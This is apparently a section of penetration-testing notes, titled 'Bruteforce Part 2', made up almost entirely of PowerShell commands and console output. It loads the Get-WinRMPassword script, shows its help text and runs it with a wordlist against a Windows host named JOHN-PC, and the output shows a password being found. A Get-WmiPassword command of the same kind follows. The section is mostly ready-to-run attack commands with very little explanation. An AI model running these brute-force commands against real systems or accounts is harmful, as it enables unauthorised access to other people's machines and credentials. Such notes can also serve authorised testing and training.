#### 44. Bruteforce Part 2

###### Brute Forcing
- [```Get-WinRMPassword```](https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html)

```PowerShell
PS C:\Users\Administrator\Desktop> . .\Get-WinRMPassword.ps1
```

```PowerShell
PS C:\Users\Administrator\Desktop> Get-Help Get-WinRMPassword -Examples

NAME
    Get-WinRMPassword

SYNOPSIS
    Simple bruteforce attack upon a Windows machine running WinRM

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS>get-winrmpassword -UserName Administrator -ComputerName myvictim -WordList c:\mywordlist.txt


    Will read mywordlist.txt and for each entry in that list, try Administrator:<entry>

PS C:\Users\Administrator\Desktop>
```

```PowerShell
PS C:\Users\Administrator\Desktop> Get-WinRMPassword -username John -ComputerName JOHN-PC -wordlist .\pass.txt
You cannot call a method on a null-valued expression.
At C:\Users\Administrator\Desktop\Get-WinRMPassword.ps1:85 char:12
+     } elseif (-not $ourerror.ErrorDetails.Message.Contains("The user name or passwo ...
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

Password Found: Ab12345
PS C:\Users\Administrator\Desktop>
```

```PowerShell
PS C:\Users\Administrator\Desktop> Get-WinRMPassword -username John -ComputerName JOHN-PC -wordlist .\pass.txt -Verbose
VERBOSE: Trying Administrator
You cannot call a method on a null-valued expression.
At C:\Users\Administrator\Desktop\Get-WinRMPassword.ps1:85 char:12
+     } elseif (-not $ourerror.ErrorDetails.Message.Contains("The user name or passwo ...
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

VERBOSE: Trying Ab12345
Password Found: Ab12345
PS C:\Users\Administrator\Desktop>
```

- ```Get-WmiPassword```

```PowerShell
Get-WmiPassword -username John -ComputerName JOHN-PC -wordlist .\pass.txt
```